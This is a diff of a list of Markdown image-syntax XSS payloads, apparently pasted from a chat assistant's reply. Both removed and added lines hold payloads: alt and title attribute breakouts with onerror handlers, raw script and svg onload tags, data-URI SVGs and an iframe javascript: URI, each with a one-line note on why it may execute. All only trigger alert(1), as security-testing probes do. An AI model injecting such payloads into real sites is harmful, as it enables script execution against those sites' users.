@@ -1,56 +1,53 @@
-1. Classic JavaScript in title
+1. Alt Injection to Break Attribute Context
 markdown
 Copy
 Edit
-![alt](x "onerror=alert(1)")
-✅ 2. Inject Handler via Alt
-markdown
-Copy
-Edit
-![\" onerror=alert(1) src=x](x)
-Escaped quote in alt allows attribute breakage in HTML output.
+![x" onerror="alert(1)](x)
+If alt is placed directly into HTML as alt="x" onerror="alert(1)", this injects a handler.
 
-✅ 3. Use Backtick Code Escapes
+🔥 2. Title Injection to Escape Quote Context
 markdown
 Copy
 Edit
-![x`](x "onerror=alert(1)")
-Some renderers mishandle backticks in image alt.
+![x](x "title\" onerror=\"alert(1)")
+If title becomes title="title" onerror="alert(1)", JS triggers.
 
-✅ 4. Script Tag in Alt Text
+🔥 3. Markdown Renderer Confusion (HTML + Markdown)
 markdown
 Copy
 Edit
-![<script>alert(1)</script>](x)
-If alt text is directly injected into HTML, this may execute.
-
-✅ 5. Inline Event Clobbering
-markdown
-Copy
-Edit
-![alt](x '"><img src=x onerror=alert(1)>')
-This abuses malformed attribute contexts in certain Markdown parsers.
-
-✅ 6. Data URI Inside Image Source
-markdown
-Copy
-Edit
-![alt](data:image/svg+xml,<svg onload=alert(1)>) 
-Or encoded:
+![alt](x)
+<script>alert(1)</script>
+Or:
 
 markdown
 Copy
 Edit
-![alt](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)
-🧪 Experimental Clobber/Break Variants
-Break alt context and inject attribute
+![x](x)
+<svg onload=alert(1)>
+🔥 4. Broken Attribute Close
 markdown
 Copy
 Edit
-![x" onerror=alert(1)](x)
-Inject invalid tag via alt
+![x](x ' onerror=alert(1)>)
+The malformed quote may cause the browser to interpret it as a broken img with open attributes.
+
+🔬 Test for HTML Injection via Raw Tags
+Try this standalone (not inside Markdown syntax):
+
 markdown
 Copy
 Edit
-![</title><script>alert(1)</script>](x)
-If alt text is placed into <title> or <h1>, this can break tag context.
+<script>alert(1)</script>
+And:
+
+markdown
+Copy
+Edit
+<svg onload=alert(1)>
+And:
+
+markdown
+Copy
+Edit
+<iframe src="javascript:alert(1)">
